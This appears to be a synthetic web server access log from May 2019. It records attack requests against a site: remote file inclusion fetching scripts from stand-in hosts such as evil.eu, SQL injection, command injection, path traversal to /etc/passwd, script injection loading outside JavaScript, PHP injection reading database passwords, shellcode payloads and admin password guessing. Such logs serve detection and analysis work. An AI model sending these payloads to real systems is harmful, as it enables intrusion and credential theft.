182.34.27.162 - - [18/May/2019:03:31:40 +0200] "POST /core/files/js/upload.js/ HTTP/1.0" 403 72128 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
1.2.169.95 - - [18/May/2019:03:31:41 +0200] "GET /?ip=|+ls+-l HTTP/1.1" 200 75650 "/api/v1/customers/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
54.36.149.94 - - [18/May/2019:03:31:42 +0200] "GET /login.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0" 200 58792 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:31:43 +0200] "GET /index.php/?id=0%20or%201=1 HTTP/1.0" 404 6534 "/authorize.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:31:44 +0200] "GET /core/files/js/upload.js/?file=http://evil.eu/sh HTTP/1.0" 200 39202 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:31:44 +0200] "GET /core/files/js/upload.js/?file=http://evil.eu/sh HTTP/1.0" 200 52340 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:31:44 +0200] "GET /core/files/js/upload.js/?file=http://evil.eu/sh HTTP/1.0" 200 29171 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:31:44 +0200] "GET /core/files/js/upload.js/?file=http://evil.eu/sh HTTP/1.0" 200 39724 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:31:44 +0200] "GET /core/files/js/upload.js/?file=http://evil.eu/sh HTTP/1.0" 200 69320 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:31:49 +0200] "GET /?id=0%20or%201=1 HTTP/1.0" 200 451 "/api/v1/customers/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:31:49 +0200] "GET /?id=0%20or%201=1 HTTP/1.0" 200 32548 "/api/v1/customers/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:31:49 +0200] "GET /?id=0%20or%201=1 HTTP/1.0" 200 24927 "/api/v1/customers/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:31:49 +0200] "GET /?id=0%20or%201=1 HTTP/1.0" 200 6249 "/api/v1/customers/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:31:49 +0200] "GET /?id=0%20or%201=1 HTTP/1.0" 200 11230 "/api/v1/customers/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
39.36.99.88 - - [18/May/2019:03:31:54 +0200] "GET /login.php/%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 504 911 "/blog/better-products-for-2019/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:31:55 +0200] "GET /api/v1/register/?username=admin&password=1234 HTTP/1.1" 403 28950 "/api/v1/login/" "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
62.109.16.162 - - [18/May/2019:03:31:56 +0200] "GET /index.php/?ip=|+ls+-l HTTP/1.0" 404 779 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:31:56 +0200] "GET /index.php/?ip=|+ls+-l HTTP/1.0" 404 13625 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:31:56 +0200] "GET /index.php/?ip=|+ls+-l HTTP/1.0" 404 45921 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:31:56 +0200] "GET /index.php/?ip=|+ls+-l HTTP/1.0" 404 66100 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:31:56 +0200] "GET /index.php/?ip=|+ls+-l HTTP/1.0" 404 41711 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
54.36.149.94 - - [18/May/2019:03:32:01 +0200] "GET /index.php/?username=admin&password=admin2 HTTP/1.0" 200 19374 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:32:02 +0200] "GET /index.php/ HTTP/1.0" 200 12166 "/login.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:32:03 +0200] "GET /?username=admin&password=1238 HTTP/1.0" 200 15469 "/api/v1/login/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
209.133.212.79 - - [18/May/2019:03:32:04 +0200] "GET /?username=admin&password=1239 HTTP/1.1" 200 34003 "/login.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:32:05 +0200] "GET /index.php/%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 34913 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; OpenBSD amd64; rv:42.0) Gecko/20100101 Firefox/42.0"
220.243.135.5 - - [18/May/2019:03:32:06 +0200] "GET /login.php/?username=admin&password=1237 HTTP/1.0" 200 62923 "/core/files/js/upload.js/" "Mozilla/5.0 (Mobile; OPENC; rv:40.0) Gecko/40.0 Firefox/40.0"
220.243.135.5 - - [18/May/2019:03:32:06 +0200] "GET /login.php/?username=admin&password=1237 HTTP/1.0" 200 86040 "/core/files/js/upload.js/" "Mozilla/5.0 (Mobile; OPENC; rv:40.0) Gecko/40.0 Firefox/40.0"
220.243.135.5 - - [18/May/2019:03:32:06 +0200] "GET /login.php/?username=admin&password=1237 HTTP/1.0" 200 24511 "/core/files/js/upload.js/" "Mozilla/5.0 (Mobile; OPENC; rv:40.0) Gecko/40.0 Firefox/40.0"
220.243.135.5 - - [18/May/2019:03:32:06 +0200] "GET /login.php/?username=admin&password=1237 HTTP/1.0" 200 3737 "/core/files/js/upload.js/" "Mozilla/5.0 (Mobile; OPENC; rv:40.0) Gecko/40.0 Firefox/40.0"
220.243.135.5 - - [18/May/2019:03:32:06 +0200] "GET /login.php/?username=admin&password=1237 HTTP/1.0" 200 48657 "/core/files/js/upload.js/" "Mozilla/5.0 (Mobile; OPENC; rv:40.0) Gecko/40.0 Firefox/40.0"
39.36.99.88 - - [18/May/2019:03:32:11 +0200] "GET /core/themes/theme.inc/%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 6494 "/update.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
121.225.26.201 - - [18/May/2019:03:32:12 +0200] "GET /authorize.php/?ip=|+ls+-l HTTP/1.0" 200 46101 "/register.php/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
1.2.169.95 - - [18/May/2019:03:32:13 +0200] "GET /login.php/ HTTP/1.0" 200 88185 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:32:14 +0200] "GET /api/v1/register/%u0061?[buffer]=89898 HTTP/1.1" 200 86972 "/register.php/" "Mozilla/5.0 (Mobile; OPENC; rv:40.0) Gecko/40.0 Firefox/40.0"
115.221.121.44 - - [18/May/2019:03:32:15 +0200] "GET /login.php/?page=/../../../../../../etc/passwd HTTP/1.0" 404 52272 "/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
86.125.112.230 - - [18/May/2019:03:32:16 +0200] "GET /?username=admin&password=password HTTP/1.0" 200 18736 "/login.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:32:17 +0200] "GET /core/files/js/upload.js/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 200 67220 "/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:32:18 +0200] "GET /api/v1/orders/ HTTP/1.0" 200 38357 "/api/v1/register/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:32:19 +0200] "GET /api/v1/register/?username=admin&password=password HTTP/1.0" 200 33236 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:32:20 +0200] "GET /update.php/?file=http://evil.eu/sh HTTP/1.0" 200 79259 "/api/v1/register/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
115.221.121.44 - - [18/May/2019:03:32:21 +0200] "GET / HTTP/1.0" 200 35474 "/index.php/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
31.184.238.22 - - [18/May/2019:03:32:22 +0200] "GET / HTTP/1.1" 200 8589 "/cgi-bin/count.cgi/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:32:23 +0200] "GET /connection.php/%u0061?[buffer]=89898 HTTP/1.0" 200 16881 "/api/v1/register/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
87.251.81.179 - - [18/May/2019:03:32:24 +0200] "GET /api/v1/login/?username=admin&password=1237 HTTP/1.1" 404 19025 "/api/v1/customers/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:32:25 +0200] "GET /update.php/?file=http://evil.eu/sh HTTP/1.0" 200 82063 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:32:26 +0200] "GET /update.php/ HTTP/1.0" 200 67208 "/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
121.225.26.201 - - [18/May/2019:03:32:27 +0200] "GET /index.php/?file=http://evil.eu/sh HTTP/1.0" 200 23124 "/core/files/js/editor.js/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
103.36.79.144 - - [18/May/2019:03:32:28 +0200] "GET /api/v1/customers/?ip=|+ls+-l HTTP/1.0" 404 66078 "/index.php/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
220.243.135.5 - - [18/May/2019:03:32:29 +0200] "POST /api/v1/login/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.1" 200 65934 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:32:30 +0200] "GET /api/v1/customers/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0" 200 85825 "/login.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
62.109.16.162 - - [18/May/2019:03:32:31 +0200] "GET /core/files/js/upload.js/ HTTP/1.0" 200 52815 "/api/v1/login/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
121.225.26.201 - - [18/May/2019:03:32:32 +0200] "GET /index.php/ HTTP/1.0" 200 71569 "/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
220.243.135.5 - - [18/May/2019:03:32:33 +0200] "GET /core/files/js/upload.js/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 404 9384 "/" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
39.36.99.88 - - [18/May/2019:03:32:34 +0200] "GET /api/v1/login/ HTTP/1.0" 200 89669 "/login.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:32:35 +0200] "POST /core/files/js/upload.js/?file=http://evil.eu/sh HTTP/1.0" 200 519 "/update.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:32:36 +0200] "GET /core/themes/theme.inc/ HTTP/1.0" 404 67716 "/api/v1/orders/" "Mozilla/5.0 (X11; OpenBSD amd64; rv:42.0) Gecko/20100101 Firefox/42.0"
121.225.26.201 - - [18/May/2019:03:32:37 +0200] "GET /login.php/ HTTP/1.0" 200 22968 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
62.109.16.162 - - [18/May/2019:03:32:38 +0200] "GET /api/v1/login/?username=admin&password=1239 HTTP/1.0" 404 14972 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:32:39 +0200] "GET /?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.1" 200 74878 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:32:40 +0200] "GET / HTTP/1.1" 200 39271 "/api/v1/customers/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:32:41 +0200] "GET /?username=admin&password=1238 HTTP/1.0" 200 16183 "/login.php/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:32:42 +0200] "GET /orders.php/?file=http://evil.eu/sh HTTP/1.0" 200 84764 "/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
121.225.26.201 - - [18/May/2019:03:32:43 +0200] "GET /index.php/ HTTP/1.0" 200 2384 "/orders.php/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:32:44 +0200] "POST / HTTP/1.0" 404 11925 "/cgi-bin/count.cgi/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:32:45 +0200] "GET /?file=http://evil.eu/sh HTTP/1.0" 200 34488 "/api/v1/orders/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
54.36.149.52 - - [18/May/2019:03:32:46 +0200] "GET /api/v1/login/%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 22025 "/login.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:32:47 +0200] "GET /core/files/js/editor.js/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 46387 "/login.php/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:32:48 +0200] "GET /core/files/js/upload.js/ HTTP/1.0" 200 81516 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
54.36.149.94 - - [18/May/2019:03:32:49 +0200] "GET /login.php/?ip=|+ls+-l HTTP/1.0" 200 77589 "/login.php/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
31.184.238.22 - - [18/May/2019:03:32:50 +0200] "GET /api/v1/login/?file=http://evil.eu/sh HTTP/1.0" 200 18756 "/api/v1/login/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
115.221.121.44 - - [18/May/2019:03:32:51 +0200] "GET /orders.php/ HTTP/1.0" 200 26504 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:32:52 +0200] "GET /update.php/.well-known/assetlinks.json HTTP/1.0" 200 76597 "/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
39.36.99.88 - - [18/May/2019:03:32:53 +0200] "GET /api/v1/login/?post==<?php print $settings[database][password]; ?> HTTP/1.1" 504 7016 "/index.php/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:32:54 +0200] "GET /api/v1/register/ HTTP/1.0" 200 67354 "/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:32:55 +0200] "GET /?id=0%20or%201=1 HTTP/1.0" 200 86934 "/login.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:32:56 +0200] "GET /login.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 200 85428 "/api/v1/customers/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
220.243.135.5 - - [18/May/2019:03:32:57 +0200] "GET /orders.php/?post=%3script%3ealert(1); HTTP/1.0" 200 41727 "/core/files/js/upload.js/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
115.221.121.44 - - [18/May/2019:03:32:58 +0200] "GET /?file=http://evil.eu/sh HTTP/1.1" 200 26158 "/update.php/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
87.251.81.179 - - [18/May/2019:03:32:59 +0200] "GET /orders.php/.env/README.txt HTTP/1.0" 200 87070 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:33:00 +0200] "GET /index.php/ HTTP/1.0" 200 32288 "/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
209.133.212.79 - - [18/May/2019:03:33:01 +0200] "GET /index.php/ HTTP/1.1" 403 50781 "/api/v1/register/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:33:02 +0200] "GET /?file=http://evil.eu/sh HTTP/1.1" 200 89512 "/api/v1/customers/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
91.138.198.224 - - [18/May/2019:03:33:03 +0200] "GET /index.php/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 200 9765 "/api/v1/register/" "Mozilla/5.0 (Linux; Android 5.0; Nexus 4 Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.59 Mobile Safari/537.36"
62.109.16.162 - - [18/May/2019:03:33:04 +0200] "GET /register.php/?file=http://evil.eu/sh HTTP/1.0" 504 62845 "/index.php/" "Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0"
121.225.26.201 - - [18/May/2019:03:33:05 +0200] "GET /connection.php/?username=admin&password=1239 HTTP/1.0" 200 53916 "/update.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:33:06 +0200] "GET /api/v1/customers/?username=admin&password=1237 HTTP/1.0" 200 1797 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
91.138.198.224 - - [18/May/2019:03:33:07 +0200] "GET /login.php/?username=admin&password=password HTTP/1.0" 200 2205 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:33:08 +0200] "POST /login.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.1" 404 78283 "/api/v1/customers/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:33:08 +0200] "POST /login.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.1" 404 29508 "/api/v1/customers/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:33:08 +0200] "POST /login.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.1" 404 88159 "/api/v1/customers/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:33:08 +0200] "POST /login.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.1" 404 22050 "/api/v1/customers/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:33:08 +0200] "POST /login.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.1" 404 29896 "/api/v1/customers/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:33:13 +0200] "GET /?file=http://evil.eu/sh HTTP/1.0" 200 28050 "/orders.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:33:14 +0200] "GET /api/v1/register/?file=http://evil.eu/sh HTTP/1.0" 200 20100 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:33:14 +0200] "GET /api/v1/register/?file=http://evil.eu/sh HTTP/1.0" 200 78011 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:33:14 +0200] "GET /api/v1/register/?file=http://evil.eu/sh HTTP/1.0" 200 89617 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:33:14 +0200] "GET /api/v1/register/?file=http://evil.eu/sh HTTP/1.0" 200 58354 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:33:14 +0200] "GET /api/v1/register/?file=http://evil.eu/sh HTTP/1.0" 200 82044 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
86.125.112.230 - - [18/May/2019:03:33:19 +0200] "GET /connection.php/ HTTP/1.1" 200 47702 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:33:20 +0200] "GET /login.php/?user=admin&amount=100000 HTTP/1.0" 200 17094 "/core/files/js/editor.js/" "Mozilla/5.0 (Android; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0"
